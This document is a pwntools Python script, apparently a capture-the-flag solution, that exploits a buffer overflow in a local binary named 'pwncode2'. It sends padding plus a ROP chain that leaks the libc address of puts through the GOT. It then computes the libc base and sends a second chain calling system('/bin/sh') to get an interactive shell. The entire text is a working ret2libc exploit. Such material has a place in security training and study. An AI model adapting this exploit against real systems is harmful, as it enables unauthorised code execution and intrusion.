#!/usr/bin/python3
from pwn import *
context.os='linux'
context.arch='amd64'
context.log_level='debug'
context.terminal = ["tmux", "splitw", "-h","-p","60"]
elf=ELF("./pwncode2")
libc=ELF("./libc6_2.31-13_amd64.so")
p=elf.process()
#p=remote('host',ip)
gdb_script = """
b *main
c
"""
junk=b"A"*18

rop=ROP(elf)
rop.call(elf.symbols["puts"],[elf.got['puts']])
rop.call(elf.symbols["vuln"])
print(rop.dump())
stage1=junk+rop.chain()

#gdb.attach(p,gdb_script)
print(p.recvline())
print(p.recvline())
print(p.recvline())


p.sendline(stage1)

leaked_puts = p.recvline()[:8].strip().ljust(8,b'\x00')
log.success ("Leaked puts@GLIBC: " + str(leaked_puts))
leaked_puts=u64(leaked_puts)
log.success(hex(leaked_puts))


libc.address = leaked_puts - libc.symbols['puts']
rop2 = ROP(libc)
rop2.system(next(libc.search(b'/bin/sh\x00')), 0, 0)
stageII = junk + rop2.chain()
p.recvline()
p.recvline()
p.sendline(stageII)
p.interactive()
